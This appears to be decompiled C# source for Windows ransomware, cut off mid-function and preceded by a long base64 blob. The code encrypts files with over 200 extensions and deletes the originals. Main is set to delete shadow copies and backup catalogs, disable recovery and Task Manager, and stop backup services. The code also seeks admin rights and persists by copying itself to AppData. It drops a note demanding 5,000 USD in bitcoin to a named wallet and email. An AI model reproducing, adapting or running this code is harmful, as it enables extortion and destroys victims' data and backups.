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

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "note.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Instructions: We inform you that you have been infected by a critical virus, all company data was compromised", "", "Which they have to pay the ransom 5,000 USD in bitcoin to the following wallet: 14aF2oTbZebKuHD3ifWHBs9gsvMcHKEUav", "", "Otherwise, all data and confidential information of the company/organization such as accounts, users, sensitive information of employees and suppliers will be published on the dark web.", "", "Being accessible to millions of users, all computers on the network will be damaged and the information will be unrecoverable, causing serious damage to the disks.", "", "We promise that none of this will happen if you pay the ransom and we will stop the attack, we will give you the software along with instructions to remove the virus once the payment is made to the wallet.", "",
		"", "Otherwise, if you do not pay after 96 hours, the virus will proceed automatically and the data and information will be exposed.", "", "We recommend platforms such as Binance or coinbase to make the transfer", "", "Once the transfer is made, contact briar-72@proton.me"
	};

	private static string[] validExtensions = new string[236]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".exe",
		".bat", ".ps1", ".cmd", ".psm1", ".dll", ".reg"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>xKL8U79dSF01R8im3APVOQ2d5mVT0TPPi9lPtyK6sP9/OpnMkk+ngaintiZqq/KZ7jLYZ6L/RX1J9KEZ5Sv3GJOd2mexBDkvw97CEqgYn51LqT0rUScPoguilgFcdU7+6aIL5T9f8fPNtLOwBw2WRQo9y3yWtLhK9hNEoA6vmOKTnFZI97HoZiV0oa/hHG/N2U7XUZS/omaHk6zkA4coYtckeEfHwu26vRCqqOsuLKvqxoOb9fxB4TTrYpJTb+qQQUAMBTSKO2hTbo+97olRxgKzQ9RD3M3aPJHxHfjmw3bxa/s7EKsWLDvcej5GXDWdIn47jaGvh+Z2zBJ25j8BDQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
